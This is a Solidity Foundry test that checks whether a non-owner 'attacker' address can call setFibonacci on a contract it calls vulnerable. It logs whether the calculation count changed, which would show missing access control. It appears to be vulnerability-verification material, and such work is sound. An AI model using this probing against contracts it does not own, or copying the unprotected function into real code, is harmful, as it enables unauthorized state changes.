// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/FibonacciBalance.sol";

contract FibonacciLibTest is Test {
    FibonacciLib public fibLib;
    address public attacker = makeAddr("attacker");

    function setUp() public {
        // Deploy the vulnerable FibonacciLib contract
        fibLib = new FibonacciLib();
    }

    function test_SetFibonacciByNonOwner() public {
        // --- BEFORE-Trigger ---
        uint256 initialCount = fibLib.getCalculationCount();
        console.log("Initial calculation count:", initialCount);
        
        // --- Trigger SetFibonacci by Non-Owner ---
        console.log("Attacker calls setFibonacci(5)");
        vm.prank(attacker);
        fibLib.setFibonacci(5);  // Arbitrary input
        
        // --- AFTER-Trigger ---
        uint256 updatedCount = fibLib.getCalculationCount();
        console.log("Updated calculation count:", updatedCount);
        
        // --- Vulnerability Verification ---
        uint256 expectedDifference = 1;
        if (updatedCount == initialCount + expectedDifference) {
            console.log("Vulnerability Exists: Unauthorized user increased calculation count");
        } else {
            console.log("Vulnerability not Exist: Calculation count unchanged by unauthorized user");
        }
        
        // Final verdict
        if (updatedCount == initialCount + expectedDifference) {
            console.log("Vulnerability Exists: Unauthorized state modification confirmed");
        } else {
            console.log("Vulnerability not Exist: No unauthorized state change detected");
        }
    }
}